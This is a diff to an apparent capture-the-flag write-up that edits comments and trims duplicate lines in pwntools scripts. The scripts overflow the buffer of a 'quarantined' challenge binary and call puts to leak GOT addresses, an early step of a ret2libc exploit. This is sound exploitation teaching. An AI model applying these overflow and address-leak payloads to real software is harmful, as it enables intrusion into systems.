@@ -241,6 +241,7 @@ elf = ELF("./quarantined")
 p = elf.process()
 vuln = 0x8048562
 puts_plt = 0x80483c0
+# Search the address of string "1+1"
 string = next(elf.search("1+1"))
 p.sendlineafter("1+1\n",'a'*1036+p32(puts_plt)+p32(vuln)+p32(string))
 
@@ -259,6 +260,7 @@ Lets try to leak an address in GOT!
 
 We only can leak function that called before, so only `puts` and `gets`
 
+I choose `gets` for this exploit:
 ```py
 from pwn import *
 elf = ELF("./quarantined")
@@ -281,12 +283,6 @@ It prints many bytes because `puts` function print until NULL bytes
 We only need first 4 bytes
 
 ```py
-from pwn import *
-elf = ELF("./quarantined")
-p = elf.process()
-vuln = 0x8048562
-puts_plt = 0x80483c0
-gets_got = 0x804a010
 p.sendlineafter("1+1\n",'a'*1036+p32(puts_plt)+p32(vuln)+p32(gets_got))
 # [:4] get first 4 character
 # u32 converts raw bytes to number
